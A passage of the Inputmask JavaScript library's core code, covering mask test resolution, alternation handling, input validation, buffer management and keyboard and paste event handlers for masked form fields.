                        ndxInitializerClone = ndxInitializer.slice(),
                        altIndexArr = [],
                        amndx;
                      if (typeof altIndex == "string") {
                        altIndexArr = altIndex.split(",");
                      } else {
                        for (amndx = 0; amndx < alternateToken.matches.length; amndx++) {
                          altIndexArr.push(amndx.toString());
                        }
                      }
                      if (getMaskSet().excludes[pos]) {
                        var altIndexArrClone = altIndexArr.slice();
                        for (var i = 0, el = getMaskSet().excludes[pos].length; i < el; i++) {
                          altIndexArr.splice(altIndexArr.indexOf(getMaskSet().excludes[pos][i].toString()), 1);
                        }
                        if (altIndexArr.length === 0) {
                          getMaskSet().excludes[pos] = undefined;
                          altIndexArr = altIndexArrClone;
                        }
                      }
                      if (opts.keepStatic === true || isFinite(parseInt(opts.keepStatic)) && currentPos >= opts.keepStatic) altIndexArr = altIndexArr.slice(0, 1);
                      var unMatchedAlternation = false;
                      for (var ndx = 0; ndx < altIndexArr.length; ndx++) {
                        amndx = parseInt(altIndexArr[ndx]);
                        matches = [];
                        ndxInitializer = typeof altIndex === "string" ? resolveNdxInitializer(testPos, amndx, loopNdxCnt) || ndxInitializerClone.slice() : ndxInitializerClone.slice();
                        if (alternateToken.matches[amndx] && handleMatch(alternateToken.matches[amndx], [amndx].concat(loopNdx), quantifierRecurse)) match = true;else if (ndx === 0) {
                          unMatchedAlternation = true;
                        }
                        maltMatches = matches.slice();
                        testPos = currentPos;
                        matches = [];
                        for (var ndx1 = 0; ndx1 < maltMatches.length; ndx1++) {
                          var altMatch = maltMatches[ndx1],
                            dropMatch = false;
                          altMatch.match.jit = altMatch.match.jit || unMatchedAlternation;
                          altMatch.alternation = altMatch.alternation || loopNdxCnt;
                          setMergeLocators(altMatch);
                          for (var ndx2 = 0; ndx2 < malternateMatches.length; ndx2++) {
                            var altMatch2 = malternateMatches[ndx2];
                            if (typeof altIndex !== "string" || altMatch.alternation !== undefined && $.inArray(altMatch.locator[altMatch.alternation].toString(), altIndexArr) !== -1) {
                              if (altMatch.match.nativeDef === altMatch2.match.nativeDef) {
                                dropMatch = true;
                                setMergeLocators(altMatch2, altMatch);
                                break;
                              } else if (isSubsetOf(altMatch, altMatch2)) {
                                if (setMergeLocators(altMatch, altMatch2)) {
                                  dropMatch = true;
                                  malternateMatches.splice(malternateMatches.indexOf(altMatch2), 0, altMatch);
                                }
                                break;
                              } else if (isSubsetOf(altMatch2, altMatch)) {
                                setMergeLocators(altMatch2, altMatch);
                                break;
                              } else if (staticCanMatchDefinition(altMatch, altMatch2)) {
                                if (setMergeLocators(altMatch, altMatch2)) {
                                  dropMatch = true;
                                  malternateMatches.splice(malternateMatches.indexOf(altMatch2), 0, altMatch);
                                }
                                break;
                              }
                            }
                          }
                          if (!dropMatch) {
                            malternateMatches.push(altMatch);
                          }
                        }
                      }
                      matches = currentMatches.concat(malternateMatches);
                      testPos = pos;
                      insertStop = matches.length > 0;
                      match = malternateMatches.length > 0;
                      ndxInitializer = ndxInitializerClone.slice();
                    } else match = handleMatch(alternateToken.matches[altIndex] || maskToken.matches[altIndex], [altIndex].concat(loopNdx), quantifierRecurse);
                    if (match) return true;
                  } else if (match.isQuantifier && quantifierRecurse !== maskToken.matches[$.inArray(match, maskToken.matches) - 1]) {
                    var qt = match;
                    for (var qndx = ndxInitializer.length > 0 ? ndxInitializer.shift() : 0; qndx < (isNaN(qt.quantifier.max) ? qndx + 1 : qt.quantifier.max) && testPos <= pos; qndx++) {
                      var tokenGroup = maskToken.matches[$.inArray(qt, maskToken.matches) - 1];
                      match = handleMatch(tokenGroup, [qndx].concat(loopNdx), tokenGroup);
                      if (match) {
                        latestMatch = matches[matches.length - 1].match;
                        latestMatch.optionalQuantifier = qndx > qt.quantifier.min - 1;
                        latestMatch.jit = (qndx || 1) * tokenGroup.matches.indexOf(latestMatch) >= qt.quantifier.jit;
                        if (latestMatch.optionalQuantifier && isFirstMatch(latestMatch, tokenGroup)) {
                          insertStop = true;
                          testPos = pos;
                          break;
                        }
                        if (latestMatch.jit && !latestMatch.optionalQuantifier) {
                          offset = tokenGroup.matches.indexOf(latestMatch);
                          testPos = pos;
                          insertStop = true;
                          break;
                        }
                        return true;
                      }
                    }
                  } else {
                    match = resolveTestFromToken(match, ndxInitializer, loopNdx, quantifierRecurse);
                    if (match) return true;
                  }
                } else {
                  testPos++;
                }
              }
              for (var tndx = ndxInitializer.length > 0 ? ndxInitializer.shift() : 0; tndx < maskToken.matches.length; tndx = tndx + 1 + offset) {
                offset = 0;
                if (maskToken.matches[tndx].isQuantifier !== true) {
                  var match = handleMatch(maskToken.matches[tndx], [tndx].concat(loopNdx), quantifierRecurse);
                  if (match && testPos === pos) {
                    return match;
                  } else if (testPos > pos) {
                    break;
                  }
                }
              }
            }
            function mergeLocators(pos, tests) {
              var locator = [];
              if (!$.isArray(tests)) tests = [tests];
              if (tests.length > 0) {
                if (tests[0].alternation === undefined) {
                  locator = determineTestTemplate(pos, tests.slice()).locator.slice();
                  if (locator.length === 0) locator = tests[0].locator.slice();
                } else {
                  $.each(tests, function (ndx, tst) {
                    if (tst.def !== "") {
                      if (locator.length === 0) locator = tst.locator.slice();else {
                        for (var i = 0; i < locator.length; i++) {
                          if (tst.locator[i] && locator[i].toString().indexOf(tst.locator[i]) === -1) {
                            locator[i] += "," + tst.locator[i];
                          }
                        }
                      }
                    }
                  });
                }
              }
              return locator;
            }
            if (pos > -1) {
              if (ndxIntlzr === undefined) {
                var previousPos = pos - 1,
                  test;
                while ((test = getMaskSet().validPositions[previousPos] || getMaskSet().tests[previousPos]) === undefined && previousPos > -1) {
                  previousPos--;
                }
                if (test !== undefined && previousPos > -1) {
                  ndxInitializer = mergeLocators(previousPos, test);
                  cacheDependency = ndxInitializer.join("");
                  testPos = previousPos;
                }
              }
              if (getMaskSet().tests[pos] && getMaskSet().tests[pos][0].cd === cacheDependency) {
                return getMaskSet().tests[pos];
              }
              for (var mtndx = ndxInitializer.shift(); mtndx < maskTokens.length; mtndx++) {
                var match = resolveTestFromToken(maskTokens[mtndx], ndxInitializer, [mtndx]);
                if (match && testPos === pos || testPos > pos) {
                  break;
                }
              }
            }
            if (matches.length === 0 || insertStop) {
              matches.push({
                match: {
                  fn: null,
                  optionality: false,
                  casing: null,
                  def: "",
                  placeholder: ""
                },
                locator: [],
                mloc: {},
                cd: cacheDependency
              });
            }
            if (ndxIntlzr !== undefined && getMaskSet().tests[pos]) {
              return $.extend(true, [], matches);
            }
            getMaskSet().tests[pos] = $.extend(true, [], matches);
            return getMaskSet().tests[pos];
          }
          function getBufferTemplate() {
            if (getMaskSet()._buffer === undefined) {
              getMaskSet()._buffer = getMaskTemplate(false, 1);
              if (getMaskSet().buffer === undefined) getMaskSet().buffer = getMaskSet()._buffer.slice();
            }
            return getMaskSet()._buffer;
          }
          function getBuffer(noCache) {
            if (getMaskSet().buffer === undefined || noCache === true) {
              getMaskSet().buffer = getMaskTemplate(true, getLastValidPosition(), true);
            }
            return getMaskSet().buffer;
          }
          function refreshFromBuffer(start, end, buffer) {
            var i, p;
            if (start === true) {
              resetMaskSet();
              start = 0;
              end = buffer.length;
            } else {
              for (i = start; i < end; i++) {
                delete getMaskSet().validPositions[i];
              }
            }
            p = start;
            for (i = start; i < end; i++) {
              resetMaskSet(true);
              if (buffer[i] !== opts.skipOptionalPartCharacter) {
                var valResult = isValid(p, buffer[i], true, true);
                if (valResult !== false) {
                  resetMaskSet(true);
                  p = valResult.caret !== undefined ? valResult.caret : valResult.pos + 1;
                }
              }
            }
          }
          function casing(elem, test, pos) {
            switch (opts.casing || test.casing) {
              case "upper":
                elem = elem.toUpperCase();
                break;
              case "lower":
                elem = elem.toLowerCase();
                break;
              case "title":
                var posBefore = getMaskSet().validPositions[pos - 1];
                if (pos === 0 || posBefore && posBefore.input === String.fromCharCode(Inputmask.keyCode.SPACE)) {
                  elem = elem.toUpperCase();
                } else {
                  elem = elem.toLowerCase();
                }
                break;
              default:
                if ($.isFunction(opts.casing)) {
                  var args = Array.prototype.slice.call(arguments);
                  args.push(getMaskSet().validPositions);
                  elem = opts.casing.apply(this, args);
                }
            }
            return elem;
          }
          function checkAlternationMatch(altArr1, altArr2, na) {
            var altArrC = opts.greedy ? altArr2 : altArr2.slice(0, 1),
              isMatch = false,
              naArr = na !== undefined ? na.split(",") : [],
              naNdx;
            for (var i = 0; i < naArr.length; i++) {
              if ((naNdx = altArr1.indexOf(naArr[i])) !== -1) {
                altArr1.splice(naNdx, 1);
              }
            }
            for (var alndx = 0; alndx < altArr1.length; alndx++) {
              if ($.inArray(altArr1[alndx], altArrC) !== -1) {
                isMatch = true;
                break;
              }
            }
            return isMatch;
          }
          function alternate(pos, c, strict, fromSetValid, rAltPos) {
            var validPsClone = $.extend(true, {}, getMaskSet().validPositions),
              lastAlt,
              alternation,
              isValidRslt = false,
              altPos,
              prevAltPos,
              i,
              validPos,
              decisionPos,
              lAltPos = rAltPos !== undefined ? rAltPos : getLastValidPosition();
            if (lAltPos === -1 && rAltPos === undefined) {
              lastAlt = 0;
              prevAltPos = getTest(lastAlt);
              alternation = prevAltPos.alternation;
            } else {
              for (; lAltPos >= 0; lAltPos--) {
                altPos = getMaskSet().validPositions[lAltPos];
                if (altPos && altPos.alternation !== undefined) {
                  if (prevAltPos && prevAltPos.locator[altPos.alternation] !== altPos.locator[altPos.alternation]) {
                    break;
                  }
                  lastAlt = lAltPos;
                  alternation = getMaskSet().validPositions[lastAlt].alternation;
                  prevAltPos = altPos;
                }
              }
            }
            if (alternation !== undefined) {
              decisionPos = parseInt(lastAlt);
              getMaskSet().excludes[decisionPos] = getMaskSet().excludes[decisionPos] || [];
              if (pos !== true) {
                getMaskSet().excludes[decisionPos].push(getDecisionTaker(prevAltPos));
              }
              var validInputsClone = [],
                staticInputsBeforePos = 0;
              for (i = decisionPos; i < getLastValidPosition(undefined, true) + 1; i++) {
                validPos = getMaskSet().validPositions[i];
                if (validPos && validPos.generatedInput !== true) {
                  validInputsClone.push(validPos.input);
                } else if (i < pos) staticInputsBeforePos++;
                delete getMaskSet().validPositions[i];
              }
              while (getMaskSet().excludes[decisionPos] && getMaskSet().excludes[decisionPos].length < 10) {
                var posOffset = staticInputsBeforePos * -1,
                  validInputs = validInputsClone.slice();
                getMaskSet().tests[decisionPos] = undefined;
                resetMaskSet(true);
                isValidRslt = true;
                while (validInputs.length > 0) {
                  var input = validInputs.shift();
                  if (!(isValidRslt = isValid(getLastValidPosition(undefined, true) + 1, input, false, fromSetValid, true))) {
                    break;
                  }
                }
                if (isValidRslt && c !== undefined) {
                  var targetLvp = getLastValidPosition(pos) + 1;
                  for (i = decisionPos; i < getLastValidPosition() + 1; i++) {
                    validPos = getMaskSet().validPositions[i];
                    if ((validPos === undefined || validPos.match.fn == null) && i < pos + posOffset) {
                      posOffset++;
                    }
                  }
                  pos = pos + posOffset;
                  isValidRslt = isValid(pos > targetLvp ? targetLvp : pos, c, strict, fromSetValid, true);
                }
                if (!isValidRslt) {
                  resetMaskSet();
                  prevAltPos = getTest(decisionPos);
                  getMaskSet().validPositions = $.extend(true, {}, validPsClone);
                  if (getMaskSet().excludes[decisionPos]) {
                    var decisionTaker = getDecisionTaker(prevAltPos);
                    if (getMaskSet().excludes[decisionPos].indexOf(decisionTaker) !== -1) {
                      isValidRslt = alternate(pos, c, strict, fromSetValid, decisionPos - 1);
                      break;
                    }
                    getMaskSet().excludes[decisionPos].push(decisionTaker);
                    for (i = decisionPos; i < getLastValidPosition(undefined, true) + 1; i++) {
                      delete getMaskSet().validPositions[i];
                    }
                  } else {
                    isValidRslt = alternate(pos, c, strict, fromSetValid, decisionPos - 1);
                    break;
                  }
                } else break;
              }
            }
            getMaskSet().excludes[decisionPos] = undefined;
            return isValidRslt;
          }
          function isValid(pos, c, strict, fromSetValid, fromAlternate, validateOnly) {
            function isSelection(posObj) {
              return isRTL ? posObj.begin - posObj.end > 1 || posObj.begin - posObj.end === 1 : posObj.end - posObj.begin > 1 || posObj.end - posObj.begin === 1;
            }
            strict = strict === true;
            var maskPos = pos;
            if (pos.begin !== undefined) {
              maskPos = isRTL ? pos.end : pos.begin;
            }
            function _isValid(position, c, strict) {
              var rslt = false;
              $.each(getTests(position), function (ndx, tst) {
                var test = tst.match;
                getBuffer(true);
                rslt = test.fn != null ? test.fn.test(c, getMaskSet(), position, strict, opts, isSelection(pos)) : (c === test.def || c === opts.skipOptionalPartCharacter) && test.def !== "" ? {
                  c: getPlaceholder(position, test, true) || test.def,
                  pos: position
                } : false;
                if (rslt !== false) {
                  var elem = rslt.c !== undefined ? rslt.c : c,
                    validatedPos = position;
                  elem = elem === opts.skipOptionalPartCharacter && test.fn === null ? getPlaceholder(position, test, true) || test.def : elem;
                  if (rslt.remove !== undefined) {
                    if (!$.isArray(rslt.remove)) rslt.remove = [rslt.remove];
                    $.each(rslt.remove.sort(function (a, b) {
                      return b - a;
                    }), function (ndx, lmnt) {
                      revalidateMask({
                        begin: lmnt,
                        end: lmnt + 1
                      });
                    });
                  }
                  if (rslt.insert !== undefined) {
                    if (!$.isArray(rslt.insert)) rslt.insert = [rslt.insert];
                    $.each(rslt.insert.sort(function (a, b) {
                      return a - b;
                    }), function (ndx, lmnt) {
                      isValid(lmnt.pos, lmnt.c, true, fromSetValid);
                    });
                  }
                  if (rslt !== true && rslt.pos !== undefined && rslt.pos !== position) {
                    validatedPos = rslt.pos;
                  }
                  if (rslt !== true && rslt.pos === undefined && rslt.c === undefined) {
                    return false;
                  }
                  if (!revalidateMask(pos, $.extend({}, tst, {
                    input: casing(elem, test, validatedPos)
                  }), fromSetValid, validatedPos)) {
                    rslt = false;
                  }
                  return false;
                }
              });
              return rslt;
            }
            var result = true,
              positionsClone = $.extend(true, {}, getMaskSet().validPositions);
            if ($.isFunction(opts.preValidation) && !strict && fromSetValid !== true && validateOnly !== true) {
              result = opts.preValidation(getBuffer(), maskPos, c, isSelection(pos), opts, getMaskSet());
            }
            if (result === true) {
              trackbackPositions(undefined, maskPos, true);
              if (maxLength === undefined || maskPos < maxLength) {
                result = _isValid(maskPos, c, strict);
                if ((!strict || fromSetValid === true) && result === false && validateOnly !== true) {
                  var currentPosValid = getMaskSet().validPositions[maskPos];
                  if (currentPosValid && currentPosValid.match.fn === null && (currentPosValid.match.def === c || c === opts.skipOptionalPartCharacter)) {
                    result = {
                      caret: seekNext(maskPos)
                    };
                  } else if ((opts.insertMode || getMaskSet().validPositions[seekNext(maskPos)] === undefined) && !isMask(maskPos, true)) {
                    for (var nPos = maskPos + 1, snPos = seekNext(maskPos); nPos <= snPos; nPos++) {
                      result = _isValid(nPos, c, strict);
                      if (result !== false) {
                        result = trackbackPositions(maskPos, result.pos !== undefined ? result.pos : nPos) || result;
                        maskPos = nPos;
                        break;
                      }
                    }
                  }
                }
              }
              if (result === false && opts.keepStatic !== false && (opts.regex == null || isComplete(getBuffer())) && !strict && fromAlternate !== true) {
                result = alternate(maskPos, c, strict, fromSetValid);
              }
              if (result === true) {
                result = {
                  pos: maskPos
                };
              }
            }
            if ($.isFunction(opts.postValidation) && result !== false && !strict && fromSetValid !== true && validateOnly !== true) {
              var postResult = opts.postValidation(getBuffer(true), pos.begin !== undefined ? isRTL ? pos.end : pos.begin : pos, result, opts);
              if (postResult !== undefined) {
                if (postResult.refreshFromBuffer && postResult.buffer) {
                  var refresh = postResult.refreshFromBuffer;
                  refreshFromBuffer(refresh === true ? refresh : refresh.start, refresh.end, postResult.buffer);
                }
                result = postResult === true ? result : postResult;
              }
            }
            if (result && result.pos === undefined) {
              result.pos = maskPos;
            }
            if (result === false || validateOnly === true) {
              resetMaskSet(true);
              getMaskSet().validPositions = $.extend(true, {}, positionsClone);
            }
            return result;
          }
          function trackbackPositions(originalPos, newPos, fillOnly) {
            var result;
            if (originalPos === undefined) {
              for (originalPos = newPos - 1; originalPos > 0; originalPos--) {
                if (getMaskSet().validPositions[originalPos]) break;
              }
            }
            for (var ps = originalPos; ps < newPos; ps++) {
              if (getMaskSet().validPositions[ps] === undefined && !isMask(ps, true)) {
                var vp = ps == 0 ? getTest(ps) : getMaskSet().validPositions[ps - 1];
                if (vp) {
                  var tests = getTests(ps).slice();
                  if (tests[tests.length - 1].match.def === "") tests.pop();
                  var bestMatch = determineTestTemplate(ps, tests);
                  bestMatch = $.extend({}, bestMatch, {
                    input: getPlaceholder(ps, bestMatch.match, true) || bestMatch.match.def
                  });
                  bestMatch.generatedInput = true;
                  revalidateMask(ps, bestMatch, true);
                  if (fillOnly !== true) {
                    var cvpInput = getMaskSet().validPositions[newPos].input;
                    getMaskSet().validPositions[newPos] = undefined;
                    result = isValid(newPos, cvpInput, true, true);
                  }
                }
              }
            }
            return result;
          }
          function revalidateMask(pos, validTest, fromSetValid, validatedPos) {
            function IsEnclosedStatic(pos, valids, selection) {
              var posMatch = valids[pos];
              if (posMatch !== undefined && (posMatch.match.fn === null && posMatch.match.optionality !== true || posMatch.input === opts.radixPoint)) {
                var prevMatch = selection.begin <= pos - 1 ? valids[pos - 1] && valids[pos - 1].match.fn === null && valids[pos - 1] : valids[pos - 1],
                  nextMatch = selection.end > pos + 1 ? valids[pos + 1] && valids[pos + 1].match.fn === null && valids[pos + 1] : valids[pos + 1];
                return prevMatch && nextMatch;
              }
              return false;
            }
            var begin = pos.begin !== undefined ? pos.begin : pos,
              end = pos.end !== undefined ? pos.end : pos;
            if (pos.begin > pos.end) {
              begin = pos.end;
              end = pos.begin;
            }
            validatedPos = validatedPos !== undefined ? validatedPos : begin;
            if (begin !== end || opts.insertMode && getMaskSet().validPositions[validatedPos] !== undefined && fromSetValid === undefined) {
              var positionsClone = $.extend(true, {}, getMaskSet().validPositions),
                lvp = getLastValidPosition(undefined, true),
                i;
              getMaskSet().p = begin;
              for (i = lvp; i >= begin; i--) {
                if (getMaskSet().validPositions[i] && getMaskSet().validPositions[i].match.nativeDef === "+") {
                  opts.isNegative = false;
                }
                delete getMaskSet().validPositions[i];
              }
              var valid = true,
                j = validatedPos,
                vps = getMaskSet().validPositions,
                needsValidation = false,
                posMatch = j,
                i = j;
              if (validTest) {
                getMaskSet().validPositions[validatedPos] = $.extend(true, {}, validTest);
                posMatch++;
                j++;
                if (begin < end) i++;
              }
              for (; i <= lvp; i++) {
                var t = positionsClone[i];
                if (t !== undefined && (i >= end || i >= begin && t.generatedInput !== true && IsEnclosedStatic(i, positionsClone, {
                  begin: begin,
                  end: end
                }))) {
                  while (getTest(posMatch).match.def !== "") {
                    if (needsValidation === false && positionsClone[posMatch] && positionsClone[posMatch].match.nativeDef === t.match.nativeDef) {
                      getMaskSet().validPositions[posMatch] = $.extend(true, {}, positionsClone[posMatch]);
                      getMaskSet().validPositions[posMatch].input = t.input;
                      trackbackPositions(undefined, posMatch, true);
                      j = posMatch + 1;
                      valid = true;
                    } else if (positionCanMatchDefinition(posMatch, t.match.def)) {
                      var result = isValid(posMatch, t.input, true, true);
                      valid = result !== false;
                      j = result.caret || result.insert ? getLastValidPosition() : posMatch + 1;
                      needsValidation = true;
                    } else {
                      valid = t.generatedInput === true || t.input === opts.radixPoint && opts.numericInput === true;
                    }
                    if (valid) break;
                    if (!valid && posMatch > end && isMask(posMatch, true) && (t.match.fn !== null || posMatch > getMaskSet().maskLength)) {
                      break;
                    }
                    posMatch++;
                  }
                  if (getTest(posMatch).match.def == "") valid = false;
                  posMatch = j;
                }
                if (!valid) break;
              }
              if (!valid) {
                getMaskSet().validPositions = $.extend(true, {}, positionsClone);
                resetMaskSet(true);
                return false;
              }
            } else if (validTest) {
              getMaskSet().validPositions[validatedPos] = $.extend(true, {}, validTest);
            }
            resetMaskSet(true);
            return true;
          }
          function isMask(pos, strict) {
            var test = getTestTemplate(pos).match;
            if (test.def === "") test = getTest(pos).match;
            if (test.fn != null) {
              return test.fn;
            }
            if (strict !== true && pos > -1) {
              var tests = getTests(pos);
              return tests.length > 1 + (tests[tests.length - 1].match.def === "" ? 1 : 0);
            }
            return false;
          }
          function seekNext(pos, newBlock) {
            var position = pos + 1;
            while (getTest(position).match.def !== "" && (newBlock === true && (getTest(position).match.newBlockMarker !== true || !isMask(position)) || newBlock !== true && !isMask(position))) {
              position++;
            }
            return position;
          }
          function seekPrevious(pos, newBlock) {
            var position = pos,
              tests;
            if (position <= 0) return 0;
            while (--position > 0 && (newBlock === true && getTest(position).match.newBlockMarker !== true || newBlock !== true && !isMask(position) && (tests = getTests(position), tests.length < 2 || tests.length === 2 && tests[1].match.def === ""))) {}
            return position;
          }
          function getBufferElement(position) {
            return getMaskSet().validPositions[position] === undefined ? getPlaceholder(position) : getMaskSet().validPositions[position].input;
          }
          function writeBuffer(input, buffer, caretPos, event, triggerEvents) {
            if (event && $.isFunction(opts.onBeforeWrite)) {
              var result = opts.onBeforeWrite.call(inputmask, event, buffer, caretPos, opts);
              if (result) {
                if (result.refreshFromBuffer) {
                  var refresh = result.refreshFromBuffer;
                  refreshFromBuffer(refresh === true ? refresh : refresh.start, refresh.end, result.buffer || buffer);
                  buffer = getBuffer(true);
                }
                if (caretPos !== undefined) caretPos = result.caret !== undefined ? result.caret : caretPos;
              }
            }
            if (input !== undefined) {
              input.inputmask._valueSet(buffer.join(""));
              if (caretPos !== undefined && (event === undefined || event.type !== "blur")) {
                caret(input, caretPos);
              } else renderColorMask(input, caretPos, buffer.length === 0);
              if (triggerEvents === true) {
                var $input = $(input),
                  nptVal = input.inputmask._valueGet();
                skipInputEvent = true;
                $input.trigger("input");
                setTimeout(function () {
                  if (nptVal === getBufferTemplate().join("")) {
                    $input.trigger("cleared");
                  } else if (isComplete(buffer) === true) {
                    $input.trigger("complete");
                  }
                }, 0);
              }
            }
          }
          function getPlaceholder(pos, test, returnPL) {
            test = test || getTest(pos).match;
            if (test.placeholder !== undefined || returnPL === true) {
              return $.isFunction(test.placeholder) ? test.placeholder(opts) : test.placeholder;
            } else if (test.fn === null) {
              if (pos > -1 && getMaskSet().validPositions[pos] === undefined) {
                var tests = getTests(pos),
                  staticAlternations = [],
                  prevTest;
                if (tests.length > 1 + (tests[tests.length - 1].match.def === "" ? 1 : 0)) {
                  for (var i = 0; i < tests.length; i++) {
                    if (tests[i].match.optionality !== true && tests[i].match.optionalQuantifier !== true && (tests[i].match.fn === null || prevTest === undefined || tests[i].match.fn.test(prevTest.match.def, getMaskSet(), pos, true, opts) !== false)) {
                      staticAlternations.push(tests[i]);
                      if (tests[i].match.fn === null) prevTest = tests[i];
                      if (staticAlternations.length > 1) {
                        if (/[0-9a-bA-Z]/.test(staticAlternations[0].match.def)) {
                          return opts.placeholder.charAt(pos % opts.placeholder.length);
                        }
                      }
                    }
                  }
                }
              }
              return test.def;
            }
            return opts.placeholder.charAt(pos % opts.placeholder.length);
          }
          var EventRuler = {
            on: function on(input, eventName, eventHandler) {
              var ev = function ev(e) {
                var that = this;
                if (that.inputmask === undefined && this.nodeName !== "FORM") {
                  var imOpts = $.data(that, "_inputmask_opts");
                  if (imOpts) new Inputmask(imOpts).mask(that);else EventRuler.off(that);
                } else if (e.type !== "setvalue" && this.nodeName !== "FORM" && (that.disabled || that.readOnly && !(e.type === "keydown" && e.ctrlKey && e.keyCode === 67 || opts.tabThrough === false && e.keyCode === Inputmask.keyCode.TAB))) {
                  e.preventDefault();
                } else {
                  switch (e.type) {
                    case "input":
                      if (skipInputEvent === true) {
                        skipInputEvent = false;
                        return e.preventDefault();
                      }
                      if (mobile) {
                        var args = arguments;
                        setTimeout(function () {
                          eventHandler.apply(that, args);
                          caret(that, that.inputmask.caretPos, undefined, true);
                        }, 0);
                        return false;
                      }
                      break;
                    case "keydown":
                      skipKeyPressEvent = false;
                      skipInputEvent = false;
                      break;
                    case "keypress":
                      if (skipKeyPressEvent === true) {
                        return e.preventDefault();
                      }
                      skipKeyPressEvent = true;
                      break;
                    case "click":
                      if (iemobile || iphone) {
                        var args = arguments;
                        setTimeout(function () {
                          eventHandler.apply(that, args);
                        }, 0);
                        return false;
                      }
                      break;
                  }
                  var returnVal = eventHandler.apply(that, arguments);
                  if (returnVal === false) {
                    e.preventDefault();
                    e.stopPropagation();
                  }
                  return returnVal;
                }
              };
              input.inputmask.events[eventName] = input.inputmask.events[eventName] || [];
              input.inputmask.events[eventName].push(ev);
              if ($.inArray(eventName, ["submit", "reset"]) !== -1) {
                if (input.form !== null) $(input.form).on(eventName, ev);
              } else {
                $(input).on(eventName, ev);
              }
            },
            off: function off(input, event) {
              if (input.inputmask && input.inputmask.events) {
                var events;
                if (event) {
                  events = [];
                  events[event] = input.inputmask.events[event];
                } else {
                  events = input.inputmask.events;
                }
                $.each(events, function (eventName, evArr) {
                  while (evArr.length > 0) {
                    var ev = evArr.pop();
                    if ($.inArray(eventName, ["submit", "reset"]) !== -1) {
                      if (input.form !== null) $(input.form).off(eventName, ev);
                    } else {
                      $(input).off(eventName, ev);
                    }
                  }
                  delete input.inputmask.events[eventName];
                });
              }
            }
          };
          var EventHandlers = {
            keydownEvent: function keydownEvent(e) {
              var input = this,
                $input = $(input),
                k = e.keyCode,
                pos = caret(input);
              if (k === Inputmask.keyCode.BACKSPACE || k === Inputmask.keyCode.DELETE || iphone && k === Inputmask.keyCode.BACKSPACE_SAFARI || e.ctrlKey && k === Inputmask.keyCode.X && !isInputEventSupported("cut")) {
                e.preventDefault();
                handleRemove(input, k, pos);
                writeBuffer(input, getBuffer(true), getMaskSet().p, e, input.inputmask._valueGet() !== getBuffer().join(""));
              } else if (k === Inputmask.keyCode.END || k === Inputmask.keyCode.PAGE_DOWN) {
                e.preventDefault();
                var caretPos = seekNext(getLastValidPosition());
                caret(input, e.shiftKey ? pos.begin : caretPos, caretPos, true);
              } else if (k === Inputmask.keyCode.HOME && !e.shiftKey || k === Inputmask.keyCode.PAGE_UP) {
                e.preventDefault();
                caret(input, 0, e.shiftKey ? pos.begin : 0, true);
              } else if ((opts.undoOnEscape && k === Inputmask.keyCode.ESCAPE || k === 90 && e.ctrlKey) && e.altKey !== true) {
                checkVal(input, true, false, undoValue.split(""));
                $input.trigger("click");
              } else if (k === Inputmask.keyCode.INSERT && !(e.shiftKey || e.ctrlKey)) {
                opts.insertMode = !opts.insertMode;
                input.setAttribute("im-insert", opts.insertMode);
              } else if (opts.tabThrough === true && k === Inputmask.keyCode.TAB) {
                if (e.shiftKey === true) {
                  if (getTest(pos.begin).match.fn === null) {
                    pos.begin = seekNext(pos.begin);
                  }
                  pos.end = seekPrevious(pos.begin, true);
                  pos.begin = seekPrevious(pos.end, true);
                } else {
                  pos.begin = seekNext(pos.begin, true);
                  pos.end = seekNext(pos.begin, true);
                  if (pos.end < getMaskSet().maskLength) pos.end--;
                }
                if (pos.begin < getMaskSet().maskLength) {
                  e.preventDefault();
                  caret(input, pos.begin, pos.end);
                }
              }
              opts.onKeyDown.call(this, e, getBuffer(), caret(input).begin, opts);
              ignorable = $.inArray(k, opts.ignorables) !== -1;
            },
            keypressEvent: function keypressEvent(e, checkval, writeOut, strict, ndx) {
              var input = this,
                $input = $(input),
                k = e.which || e.charCode || e.keyCode;
              if (checkval !== true && !(e.ctrlKey && e.altKey) && (e.ctrlKey || e.metaKey || ignorable)) {
                if (k === Inputmask.keyCode.ENTER && undoValue !== getBuffer().join("")) {
                  undoValue = getBuffer().join("");
                  setTimeout(function () {
                    $input.trigger("change");
                  }, 0);
                }
                return true;
              } else {
                if (k) {
                  if (k === 46 && e.shiftKey === false && opts.radixPoint !== "") k = opts.radixPoint.charCodeAt(0);
                  var pos = checkval ? {
                      begin: ndx,
                      end: ndx
                    } : caret(input),
                    forwardPosition,
                    c = String.fromCharCode(k),
                    offset = 0;
                  if (opts._radixDance && opts.numericInput) {
                    var caretPos = getBuffer().indexOf(opts.radixPoint.charAt(0)) + 1;
                    if (pos.begin <= caretPos) {
                      if (k === opts.radixPoint.charCodeAt(0)) offset = 1;
                      pos.begin -= 1;
                      pos.end -= 1;
                    }
                  }
                  getMaskSet().writeOutBuffer = true;
                  var valResult = isValid(pos, c, strict);
                  if (valResult !== false) {
                    resetMaskSet(true);
                    forwardPosition = valResult.caret !== undefined ? valResult.caret : seekNext(valResult.pos.begin ? valResult.pos.begin : valResult.pos);
                    getMaskSet().p = forwardPosition;
                  }
                  forwardPosition = (opts.numericInput && valResult.caret === undefined ? seekPrevious(forwardPosition) : forwardPosition) + offset;
                  if (writeOut !== false) {
                    setTimeout(function () {
                      opts.onKeyValidation.call(input, k, valResult, opts);
                    }, 0);
                    if (getMaskSet().writeOutBuffer && valResult !== false) {
                      var buffer = getBuffer();
                      writeBuffer(input, buffer, forwardPosition, e, checkval !== true);
                    }
                  }
                  e.preventDefault();
                  if (checkval) {
                    if (valResult !== false) valResult.forwardPosition = forwardPosition;
                    return valResult;
                  }
                }
              }
            },
            pasteEvent: function pasteEvent(e) {
              var input = this,
                ev = e.originalEvent || e,
                $input = $(input),
                inputValue = input.inputmask._valueGet(true),
                caretPos = caret(input),
                tempValue;
              if (isRTL) {
                tempValue = caretPos.end;
                caretPos.end = caretPos.begin;
                caretPos.begin = tempValue;
              }
              var valueBeforeCaret = inputValue.substr(0, caretPos.begin),
                valueAfterCaret = inputValue.substr(caretPos.end, inputValue.length);
              if (valueBeforeCaret === (isRTL ? getBufferTemplate().reverse() : getBufferTemplate()).slice(0, caretPos.begin).join("")) valueBeforeCaret = "";
              if (valueAfterCaret === (isRTL ? getBufferTemplate().reverse() : getBufferTemplate()).slice(caretPos.end).join("")) valueAfterCaret = "";
              if (window.clipboardData && window.clipboardData.getData) {
                inputValue = valueBeforeCaret + window.clipboardData.getData("Text") + valueAfterCaret;
              } else if (ev.clipboardData && ev.clipboardData.getData) {
                inputValue = valueBeforeCaret + ev.clipboardData.getData("text/plain") + valueAfterCaret;
              } else return true;
              var pasteValue = inputValue;
